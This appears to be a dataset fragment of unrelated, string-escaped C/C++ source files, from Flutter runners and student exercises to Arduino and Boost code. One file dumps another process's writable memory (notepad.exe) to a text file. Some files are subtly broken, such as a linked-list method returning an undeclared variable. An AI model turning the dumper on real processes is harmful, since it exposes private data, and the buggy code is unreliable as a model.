\"imgui_internal.h\"\n\n// System includes\n#include <stdint.h>     // intptr_t\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wunused-macros\"                  // warning: macro is not used                                // we define snprintf/vsnprintf on Windows so they are available, but not always used.\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wunsafe-b",
    "#include <windows.h>\n#include <stdio.h>\n#include <tlhelp32.h>  // For process snapshot functions\n\n#define PROCESS_QUERY_INFORMATION 0x0400\n#define MEM_COMMIT 0x00001000\n#define PAGE_READWRITE 0x04\n#define PROCESS_WM_READ 0x0010\n\n//Get the process ID by the process name\nDWORD GetProcessIdByName(const wchar_t* processName) {\n    PROCESSENTRY32 processEntry;\n    processEntry.dwSize = sizeof(PROCESSENTRY32);\n\n    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (hSnapshot == INVALID_HANDLE_VALUE) {\n        return 0;\n    }\n\n    if (Process32First(hSnapshot, &processEntry)) {\n        do {\n            if (!_wcsicmp(processEntry.szExeFile, processName)) {\n                CloseHandle(hSnapshot);\n                return processEntry.th32ProcessID;\n            }\n        } while (Process32Next(hSnapshot, &processEntry));\n    }\n\n    CloseHandle(hSnapshot);\n    return 0;\n}\n\nint main() {\n    SYSTEM_INFO sysInfo;\n    MEMORY_BASIC_INFORMATION memInfo;\n    SIZE_T bytesRead;  // Correct type: SIZE_T instead of DWORD\n\n   \n    GetSystemInfo(&sysInfo);\n\n    // Get minimum and maximum address space\n    LPVOID minAddress = sysInfo.lpMinimumApplicationAddress;\n    LPVOID maxAddress = sysInfo.lpMaximumApplicationAddress;\n\n    // Get Notepad process by name\n    DWORD processId = GetProcessIdByName(L\"notepad.exe\");\n    if (processId == 0) {\n        printf(\"Unable to find Notepad process.\\n\");\n        return 1;\n    }\n\n    // Open the process with necessary privileges\n    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, FALSE, processId);\n    if (hProcess == NULL) {\n        printf(\"Unable to open process.\\n\");\n        return 1;\n    }\n\n    // Open file to dump memory using fopen_s for security\n    FILE* dumpFile;\n    errno_t err = fopen_s(&dumpFile, \"dump.txt\", \"w\");\n    if (err != 0 || dumpFile == NULL) {\n        printf(\"Unable to create dump file.\\n\");\n        CloseHandle(hProcess);\n        return 1;\n    }\n\n    // Iterate through the memory regions\n    while (minAddress < maxAddress) {\n        if (VirtualQueryEx(hProcess, minAddress, &memInfo, sizeof(MEMORY_BASIC_INFORMATION)) == sizeof(MEMORY_BASIC_INFORMATION)) {\n            // Check if the memory is committed and writable\n            if ((memInfo.State == MEM_COMMIT) && (memInfo.Protect == PAGE_READWRITE)) {\n                // Allocate buffer to read memory\n                BYTE* buffer = (BYTE*)malloc(memInfo.RegionSize);\n                if (ReadProcessMemory(hProcess, memInfo.BaseAddress, buffer, memInfo.RegionSize, &bytesRead)) {\n                    // Write the contents to the file\n                    for (SIZE_T i = 0; i < bytesRead; i++) {\n                        fprintf(dumpFile, \"0x%p: %02X\\n\", (BYTE*)memInfo.BaseAddress + i, buffer[i]);\n                    }\n                }\n                free(buffer);\n            }\n            // Move to the next memory region\n            minAddress = (LPVOID)((SIZE_T)minAddress + memInfo.RegionSize);\n        }\n    }\n\n    // Clean up\n    fclose(dumpFile);\n    CloseHandle(hProcess);\n    printf(\"Memory dump completed.\\n\");\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"tugas1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Rassul Khalizov \n// Lab 6\n// 10/15/24\n\n#include <fstream>\n#include <iostream>\n#include <iomanip>\n#include <string>\n\nusing namespace std;\n\nint main()\n{\n    // Defines variables\n    ifstream inData; \n    ofstream outData;\n    int integerA, integerB;\n    char letter, letterreformed;\n    string words;\n\n    inData.open(\"inData.txt\"); //opens the file named inData.txt\n    outData.open(\"outData.txt\");  // opens the file named outData.txt\n\n    cout<<\"processing data\";  \n\n    inData >> integerA >> integerB; //uses input from inData.txt \n    outData<<\"The sum of the two integers is \" << integerA + integerB << endl; // adds the integers in inData.txt then outputs it in outData.txt\n\n    inData >> letter; \n    outData << \"The letter after \" << letter << \" is \" << char(letter + 1) << endl; //outputs the next one up the ASCII chart\n\n    inData >> words; // copies and pastes a sentence from the inData.txt to outData.txt \n    outData << words; \n\n     /*\n    The sum of the two integers is 133\n    The letter after I is J\n    What\n    */\n\n\n    return 0; \n}\n",
    "/*\n * SerailReader.cpp implements the class for handling reading, parsing\n * and handling of serial data.\n * \n * Author: Sivakumar Balasubramanian\n * Created on: August 01 2017\n */\n \n#include \"Arduino.h\"\n#include \"SerialReader.h\"\n#include\"SoftwareSerial.h\"\nSoftwareSerial bt1(0, 1);\nSerialReader::SerialReader() {\n  _state = WAITFORPACKET;\n}\n\nint SerialReader::readUpdate() {\n    while (bt1.available() > 0) {\n        // Read current byte\n        _currByte = bt1.read();\n        switch (_state) {\n            case WAITFORPACKET:\n                if (_currByte == 0xAA) {\n                    // First header found.\n                    _state = HEADER1;\n                    digitalWrite(LED_BUILTIN, 1);\n                }\n                break;\n            case HEADER1:\n                if (_currByte == 0xAA) {\n                    // Second header found.\n                    _state = HEADER2;\n                } else {\n                    _state = WAITFORPACKET;\n                }\n                break;\n            case HEADER2:\n                // Get the size of the payload.\n                // It cannot be zero or greater than maxPayloadSize.\n                if (_currByte == 0x00 || _currByte >= maxPayloadSize) {\n                    _state = WAITFORPACKET;\n                } else {\n                    _currPlSz = _currByte - 1;\n                    _plCntr = 0;\n                    _state = PAYLOAD;\n                    _chksum = 0xAA + 0xAA + _currByte;\n                }        \n                break;\n            case PAYLOAD:\n                payload[_plCntr++] = _currByte;\n                _chksum += _currByte;\n                if (_plCntr == _currPlSz) {\n                    _state = CHKSUM;\n                }\n                break;\n            case CHKSUM:\n                if (_chksum == _currByte) {\n                    _state = WAITFORHANDLING;\n                } else {\n                    _state = WAITFORPACKET;\n                }\n                break;    \n            case WAITFORHANDLING:\n                break;\n        }\n        // Return payload size only if the current state is WAITFORHANDLING\n        if (_state == WAITFORHANDLING) {\n            return _currPlSz;      \n        } else {\n            return -1;\n        }\n    }\n}\n\nvoid SerialReader::payloadHandled() {\n  _currPlSz = -1;\n  _state = WAITFORPACKET;\n}\n",
    "#include \"supplier.h\"\n#include \"costs.h\"\n#include <pcosynchro/pcothread.h>\n\nIWindowInterface *Supplier::interface = nullptr;\n\nSupplier::Supplier(int uniqueId, int fund, std::vector<ItemType> resourcesSupplied)\n    : Seller(fund, uniqueId), resourcesSupplied(resourcesSupplied), nbSupplied(0) {\n    for (const auto &item: resourcesSupplied) {\n        stocks[item] = 0;\n    }\n\n    interface->consoleAppendText(uniqueId, QString(\"Supplier Created\"));\n    interface->updateFund(uniqueId, fund);\n}\n\n\nint Supplier::request(ItemType it, int qty) {   \n    mutex.lock();\n    if (stocks[it] >= qty) {\n        stocks[it] -= qty;\n        money += getCostPerUnit(it) * qty;\n\n        mutex.unlock();\n        return getCostPerUnit(it) * qty;\n    }\n    mutex.unlock();\n    return 0;\n}\n\nvoid Supplier::run() {\n    interface->consoleAppendText(uniqueId, \"[START] Supplier routine\");\n\n    while (!PcoThread::thisThread()->stopRequested()) {\n        ItemType resourceSupplied = getRandomItemFromStock();\n        int supplierSalary = getEmployeeSalary(getEmployeeThatProduces(resourceSupplied));\n\n    \n        // Si l'argent est suffisant pour payer le salaire de l'employ\u00e9\n        mutex.lock();\n        if (money >= supplierSalary) {\n            money -= supplierSalary;\n            ++stocks[resourceSupplied];\n            ++nbSupplied;\n            mutex.unlock();\n            \n            // Simule un d\u00e9lai d'attente\n            interface->simulateWork();\n            interface->consoleAppendText(uniqueId, QString(\"Imported %1 of %2.\").arg(1).arg(getItemName(resourceSupplied)));\n        // Sinon, affiche un message d'erreur\n        } else {\n            mutex.unlock();\n            interface->consoleAppendText(uniqueId, \"Insufficient funds to pay the employee.\");\n        }\n\n        interface->updateFund(uniqueId, money);\n        interface->updateStock(uniqueId, &stocks);\n\n    }\n    interface->consoleAppendText(uniqueId, \"[STOP] Supplier routine\");\n}\n\n\nstd::map<ItemType, int> Supplier::getItemsForSale() {\n    return stocks;\n}\n\nint Supplier::getMaterialCost() {\n    int totalCost = 0;\n    for (const auto &item: resourcesSupplied) {\n        totalCost += getCostPerUnit(item);\n    }\n    return totalCost;\n}\n\nint Supplier::getAmountPaidToWorkers() {\n    return nbSupplied * getEmployeeSalary(EmployeeType::Supplier);\n}\n\nvoid Supplier::setInterface(IWindowInterface *windowInterface) {\n    interface = windowInterface;\n}\n\nstd::vector<ItemType> Supplier::getResourcesSupplied() const {\n    return resourcesSupplied;\n}\n\nint Supplier::send(ItemType it, int qty, int bill) {\n    return 0;\n}\n",
    "/*\n * This file is part of the Capibara zero (https://github.com/CapibaraZero/fw).\n * Copyright (c) 2024 Andrea Canale.\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, version 3.\n *\n * This program is distributed in the hope that it will be useful, but\n * WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program. If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"SDBridge32.hpp\"\n#include \"USBHID.h\"\n\nSDBridge32::SDBridge32() {}\n\nSDBridge32::~SDBridge32() {\n    msc.end();\n}\n\nvoid SDBridge32::begin(const char *vendor_id, const char *product_id, const char *product_revision) {\n  msc.vendorID(vendor_id);\n  msc.productID(product_id);\n  msc.productRevision(product_revision);\n  msc.onRead(onRead);\n  msc.onWrite(onWrite);\n  msc.mediaPresent(true);\n  msc.begin(SD.numSectors(), SD.sectorSize());\n}\n\nvoid SDBridge32::end() {\n    msc.end();\n}",
    "// Boost.Range library\n//\n//  Copyright Neil Groves 2009. Use, modification and\n//  distribution is subject to the Boost Software License, Version\n//  1.0. (See accompanying file LICENSE_1_0.txt or copy at\n//  http://www.boost.org/LICENSE_1_0.txt)\n//\n//\n// For more information, see http://www.boost.org/libs/range/\n//\n#include <boost/range/adaptor/copied.hpp>\n\n#include <boost/test/test_tools.hpp>\n#include <boost/test/unit_test.hpp>\n\n#include <boost/assign.hpp>\n\n#include <algorithm>\n#include <deque>\n#include <string>\n#include <vector>\n#include <boost/range/algorithm_ext.hpp>\n\nnamespace boost\n{\n    namespace\n    {\n        template< class Container >\n        void copied_test_impl( Container& c )\n        {\n            using namespace boost::adaptors;\n\n            // This is my preferred syntax using the | operator.\n            std::vector< int > test_result1;\n            boost::push_back(test_result1, c | copied(0u, c.size()));\n\n            // This is the alternative syntax preferred by some.\n            std::vector< int > test_result2;\n            boost::push_back(test_result2, adaptors::copy(c, 0u, c.size()));\n\n            BOOST_CHECK_EQUAL_COLLECTIONS( test_result1.begin(), test_result1.end(),\n                                           c.begin(), c.end() );\n\n            BOOST_CHECK_EQUAL_COLLECTIONS( test_result2.begin(), test_result2.end(),\n                                           c.begin(), c.end() );\n        }\n\n        template< class Container >\n        void copied_test_impl()\n        {\n            using namespace boost::assign;\n\n            Container c;\n\n            // test empty collection\n            copied_test_impl(c);\n\n            // test one element\n            c += 1;\n            copied_test_impl(c);\n\n            // test many elements\n            c += 1,2,2,2,3,4,4,4,4,5,6,7,8,9,9;\n            copied_test_impl(c);\n        }\n\n        void copied_test()\n        {\n            copied_test_impl< std::vector< int > >();\n            copied_test_impl< std::deque< int > >();\n        }\n    }\n}\n\nboost::unit_test::test_suite*\ninit_unit_test_suite(int argc, char* argv[])\n{\n    boost::unit_test::test_suite* test\n        = BOOST_TEST_SUITE( \"RangeTestSuite.adaptor.copied\" );\n\n    test->add( BOOST_TEST_CASE( &boost::copied_test ) );\n\n    return test;\n}\n",
    "// Pin definitions\r\n#define LEFT_SENSOR_PIN 32\r\n#define MIDDLE_SENSOR_PIN 33\r\n#define RIGHT_SENSOR_PIN 34\r\n\r\n#define MOTOR_A_PWM 18\r\n#define MOTOR_B_PWM 19\r\n#define MOTOR_A_IN1 2\r\n#define MOTOR_A_IN2 4\r\n#define MOTOR_B_IN1 16\r\n#define MOTOR_B_IN2 17\r\n\r\nvoid setup() {\r\n  // Initialize serial communication\r\n  Serial.begin(115200);\r\n\r\n  // Set sensor pins as input\r\n  pinMode(LEFT_SENSOR_PIN, INPUT);\r\n  pinMode(MIDDLE_SENSOR_PIN, INPUT);\r\n  pinMode(RIGHT_SENSOR_PIN, INPUT);\r\n\r\n  // Set motor pins as output\r\n  pinMode(MOTOR_A_PWM, OUTPUT);\r\n  pinMode(MOTOR_B_PWM, OUTPUT);\r\n  pinMode(MOTOR_A_IN1, OUTPUT);\r\n  pinMode(MOTOR_A_IN2, OUTPUT);\r\n  pinMode(MOTOR_B_IN1, OUTPUT);\r\n  pinMode(MOTOR_B_IN2, OUTPUT);\r\n\r\n  // Initialize motors\r\n  digitalWrite(MOTOR_A_IN1, LOW);\r\n  digitalWrite(MOTOR_A_IN2, LOW);\r\n  digitalWrite(MOTOR_B_IN1, LOW);\r\n  digitalWrite(MOTOR_B_IN2, LOW);\r\n}\r\n\r\nvoid loop() {\r\n  // Read sensor values\r\n  int leftSensor = digitalRead(LEFT_SENSOR_PIN);\r\n  int middleSensor = digitalRead(MIDDLE_SENSOR_PIN);\r\n  int rightSensor = digitalRead(RIGHT_SENSOR_PIN);\r\n\r\n  // Line following logic\r\n  if (middleSensor == LOW) {\r\n    // Move forward\r\n    moveForward();\r\n  } else if (leftSensor == LOW) {\r\n    // Turn left\r\n    turnLeft();\r\n  } else if (rightSensor == LOW) {\r\n    // Turn right\r\n    turnRight();\r\n  } else {\r\n    // Stop if no line detected\r\n    stopMotors();\r\n  }\r\n}\r\n\r\nvoid moveForward() {\r\n  digitalWrite(MOTOR_A_IN1, HIGH);\r\n  digitalWrite(MOTOR_A_IN2, LOW);\r\n  analogWrite(MOTOR_A_PWM, 255);\r\n\r\n  digitalWrite(MOTOR_B_IN1, HIGH);\r\n  digitalWrite(MOTOR_B_IN2, LOW);\r\n  analogWrite(MOTOR_B_PWM, 255);\r\n}\r\n\r\nvoid turnLeft() {\r\n  digitalWrite(MOTOR_A_IN1, LOW);\r\n  digitalWrite(MOTOR_A_IN2, HIGH);\r\n  analogWrite(MOTOR_A_PWM, 255);\r\n\r\n  digitalWrite(MOTOR_B_IN1, HIGH);\r\n  digitalWrite(MOTOR_B_IN2, LOW);\r\n  analogWrite(MOTOR_B_PWM, 255);\r\n}\r\n\r\nvoid turnRight() {\r\n  digitalWrite(MOTOR_A_IN1, HIGH);\r\n  digitalWrite(MOTOR_A_IN2, LOW);\r\n  analogWrite(MOTOR_A_PWM, 255);\r\n\r\n  digitalWrite(MOTOR_B_IN1, LOW);\r\n  digitalWrite(MOTOR_B_IN2, HIGH);\r\n  analogWrite(MOTOR_B_PWM, 255);\r\n}\r\n\r\nvoid stopMotors() {\r\n  digitalWrite(MOTOR_A_IN1, LOW);\r\n  digitalWrite(MOTOR_A_IN2, LOW);\r\n  analogWrite(MOTOR_A_PWM, 0);\r\n\r\n  digitalWrite(MOTOR_B_IN1, LOW);\r\n  digitalWrite(MOTOR_B_IN2, LOW);\r\n  analogWrite(MOTOR_B_PWM, 0);\r\n}\r\n\r\n",
    "#include<bits/stdc++.h>\n using namespace std;\n \nint n;\nbool pageExists(vector<int>& frame, int page) {\n    for (int i = 0; i < frame.size(); ++i) {\n        if (frame[i] == page)\n            return true;\n    }\n    return false;\n}\n\n\nvoid FCFS(vector<int>& pages, int frameSize) {\n    vector<int> frame;\n    int pageFaults = 0;\n\n    for (int i = 0; i < pages.size(); ++i) {\n        \n        if (pageExists(frame, pages[i]))\n            continue;\n\n        \n        if (frame.size() < frameSize) {\n            frame.push_back(pages[i]);\n        } else {\n            frame.erase(frame.begin());\n            frame.push_back(pages[i]);\n        }\n\n        \n        ++pageFaults;\n\n\n        cout << \"Current frame: \";\n        for (int j = 0; j < frame.size(); j++) {\n            cout << frame[j] << \" \";\n        }\n        cout << endl;\n    }\n    int hitratio = pages.size() - pageFaults;\n    cout << \"NO of Hits: \"<< hitratio << endl;\n    cout << \"Total Page Faults: \" << pageFaults << endl;\n    cout << \"Hits Ratio: \" << fixed<<setprecision(2) << ((double)hitratio / n) * 100 <<\" %\"<< endl;\n}\n\nint main() {\n    cin >> n;\n    vector<int> pages;\n\n    int frameSize ;\n    cin >> frameSize;\n\n    for(int i = 0; i < n; i++) {\n        int x; cin >> x;\n        pages.push_back(x);\n    }\n    cout << \"Page Reference String: \";\n    for (int i = 0; i < pages.size(); ++i) {\n        cout << pages[i] << \" \";\n    }\n    cout << endl;\n    cout << \"Frame Size: \" << frameSize << endl;\n    FCFS(pages, frameSize);\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"smart_home\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#ifndef LINKED_LIST_CPP\n#define LINKED_LIST_CPP\n\n#include \"LinkedList.hpp\"\n\ntemplate <typename T>\nLinkedList<T>::LinkedList() : _size(0), _head(NULL), _tail(NULL) {}\n\ntemplate <typename T>\nLinkedList<T>::LinkedList(LinkedList<T> &&other)\n    : _size(other._size), _head(other._head), _tail(other._tail)\n{\n    other._size = 0;\n    other._head = NULL;\n    other._tail = NULL;\n}\n\ntemplate <typename T>\nLinkedList<T>::LinkedList(const std::vector<T> &items) : _head(NULL), _tail(NULL), _size(0)\n{\n    for ( auto &item : items)\n    {\n        append(item);\n    }\n}\n\ntemplate <typename T>\nsize_t LinkedList<T>::size() const\n{\n    return _size;\n}\n\ntemplate <typename T>\nLinkedListNode<T> *LinkedList<T>::head() const\n{\n    return _head;\n}\n\ntemplate <typename T>\nLinkedListNode<T> *LinkedList<T>::tail() const\n{\n    return _tail;\n}\n\ntemplate <typename T>\nLinkedListNode<T> *LinkedList<T>::find(T value) const\n{\n    LinkedListNode<T> *current = _head;\n    while (current != NULL)\n    {\n        if (current->value == value)\n        {\n            return current;\n        }\n        current = current->next();\n    }\n    return NULL;\n}\n\ntemplate <typename T>\nLinkedListNode<T> *LinkedList<T>::prepend(T value)\n{\n    LinkedListNode<T> *tmp = new LinkedListNode<T>(value);\n    if (_head == NULL || _size==0)\n    {\n        _head = tmp;\n        _tail = tmp;\n    }\n    else\n    {\n        tmp->_next = _head;\n        _head = tmp;\n    }\n    _size++;\n    return tmp;\n}\n\ntemplate <typename T>\nLinkedListNode<T> *LinkedList<T>::append(T value)\n{\n    LinkedListNode<T> *current = new LinkedListNode<T>(value);\n    if (_head == NULL || _size==0)\n    {\n        _head = current;\n        _tail = current;\n    }\n    else\n    {\n        _tail->_next = current;\n        _tail = current;\n    }\n    _size++;\n    return current;\n}\n\ntemplate <typename T>\nLinkedListNode<T> *LinkedList<T>::insertAfter(LinkedListNode<T> *node, T value)\n{\n    if (node == NULL)\n    {\n        return prepend(value);\n    }\n\n    LinkedListNode<T> *newNode = new LinkedListNode<T>(value);\n    newNode->_next = node->_next;\n    node->_next = newNode;\n\n    if (node == _tail)\n    {\n        _tail = newNode;\n    }\n\n    _size++;\n    return tmp;\n}\n\ntemplate <typename T>\nstd::optional<T> LinkedList<T>::removeHead()\n{\n    if (_head == NULL||_size==0)\n    {\n        return std::nullopt;\n    }\n\n    T removedValue = _head->value;\n    LinkedListNode<T> *old = _head;\n\n    _head = _head->next();\n    if (_head == NULL||_size==0)\n    {\n        _tail = NULL;\n    }\n\n    delete old;\n    _size--;\n    return removedValue;\n}\n\ntemplate <typename T>\nbool LinkedList<T>::remove(T value)\n{\n    if (_head == NULL||_size==0)\n    {\n        return false;\n    }\n\n    if (_head->value == value)\n    {\n        removeHead();\n        return true;\n    }\n\n    LinkedListNode<T> *current = _head;\n    while (current->_next != NULL)\n    {\n        if (current->_next->value == value)\n        {\n            LinkedListNode<T> *nodeToRemove = current->_next;\n            current->_next = nodeToRemove->_next;\n\n            if (nodeToRemove == _tail)\n            {\n                _tail = current;\n            }\n\n            delete nodeToRemove;\n            _size--;\n            return true;\n        }\n        current = current->_next;\n    }\n\n    return false; \n}\n\ntemplate <typename T>\nvoid LinkedList<T>::clear()\n{\n    LinkedListNode<T> *curr = _head;\n    while (curr != NULL)\n    {\n        LinkedListNode<T> *tmp = curr;\n        curr = curr->_next;\n        delete tmp;\n    }\n\n    _head = NULL;\n    _tail = NULL;\n    _size = 0;\n}\n\ntemplate <typename T>\nLinkedList<T>::~LinkedList()\n{\n    clear();\n}\n\n#endif",
    "#define WM_DEFINE_CONFIG 1\n#include \"config.h\"\n#include \"loadini.h\"\n#include \"main.h\"\n#include \"../nu/Config.h\"\n\nbool config_no_video = false;\nextern Nullsoft::Utility::Config wmConfig;\n#pragma warning(disable:4800)\n#define READ(type, name) config_##name = (type)wmConfig.cfg_int(TEXT(\"config_\") TEXT(#name), default_##name)\n#define WRITE(type, name) wmConfig.cfg_int(TEXT(\"config_\") TEXT(#name), default_##name) = (int)config_##name\n#define DEFAULT(name) config_##name = default_##name\n\nvoid ReadConfig()\n{\n\tREAD(bool, lowmemory);\n\tREAD(bool, clock);\n\n\tREAD(bool, video_dedicated_thread);\n\tREAD(bool, video_early);\n\tREAD(int, video_early_pad);\n\tREAD(bool, video_outoforder);\n\tREAD(bool, video_catchup);\n\tREAD(int, video_jitter);\n\tREAD(int, video_drop_threshold);\n\tREAD(size_t, video_cache_frames);\n\tREAD(bool, video_notifylate);\n\tREAD(bool, video_framedropoffset);\n\n\tREAD(bool, audio_outoforder);\n\tREAD(bool, audio_dedicated_thread);\n\tREAD(int, audio_early_pad);\n\tREAD(bool, audio_early);\n\tREAD(size_t, audio_cache_frames);\n\tREAD(size_t, audio_num_channels);\n\n//\tREAD(bool, no_silent);\n//\tREAD(bool, untrusted_ok);\n\n\tREAD(bool, http_metadata);\n\tREAD(size_t, buffer_time);\n\n\tREAD(bool, extra_asx_extensions);\n\n\tREAD(int, col1);\n\tREAD(int, col2);\n}\n\nvoid WriteConfig()\n{\n\tWRITE(bool, lowmemory);\n\n\tWRITE(bool, clock);\n\n\tWRITE(bool, video_dedicated_thread);\n\tWRITE(bool, video_early);\n\tWRITE(int, video_early_pad);\n\tWRITE(bool, video_outoforder);\n\tWRITE(bool, video_catchup);\n\tWRITE(int, video_jitter);\n\tWRITE(int, video_drop_threshold);\n\tWRITE(size_t, video_cache_frames);\n\tWRITE(bool, video_notifylate);\n\tWRITE(bool, video_framedropoffset);\n\n\tWRITE(bool, audio_outoforder);\n\tWRITE(bool, audio_dedicated_thread);\n\tWRITE(int, audio_early_pad);\n\tWRITE(bool, audio_early);\n\tWRITE(size_t, audio_cache_frames);\n\tWRITE(size_t, audio_num_channels);\n\n//\tWRITE(bool, no_silent);\n//\tWRITE(bool, untrusted_ok);\n\n\tWRITE(bool, http_metadata);\n\tWRITE(size_t, buffer_time);\n\n\tWRITE(bool, extra_asx_extensions);\n\n\tWRITE(int, col1);\n\tWRITE(int, col2);\n}\n\nvoid DefaultConfig()\n{\n\tDEFAULT(http_metadata);\n//\tDEFAULT(no_silent);\n//\tDEFAULT(untrusted_ok);\n\tDEFAULT(buffer_time);\n\tDEFAULT(audio_num_channels);\n\n\tDEFAULT(audio_outoforder);\n\tDEFAULT(audio_dedicated_thread);\n\tDEFAULT(audio_early_pad);\n\tDEFAULT(audio_early);\n\tDEFAULT(audio_cache_frames);\n\n\tDEFAULT(lowmemory);\n\n\tDEFAULT(clock);\n\n\tDEFAULT(video_dedicated_thread);\n\tDEFAULT(video_early);\n\tDEFAULT(video_early_pad);\n\tDEFAULT(video_outoforder);\n\tDEFAULT(video_catchup);\n\tDEFAULT(video_jitter);\n\tDEFAULT(video_drop_threshold);\n\tDEFAULT(video_cache_frames);\n\tDEFAULT(video_notifylate);\n\tDEFAULT(video_framedropoffset);\n\n\tDEFAULT(extra_asx_extensions);\n\n\tDEFAULT(col1);\n\tDEFAULT(col2);\n}",
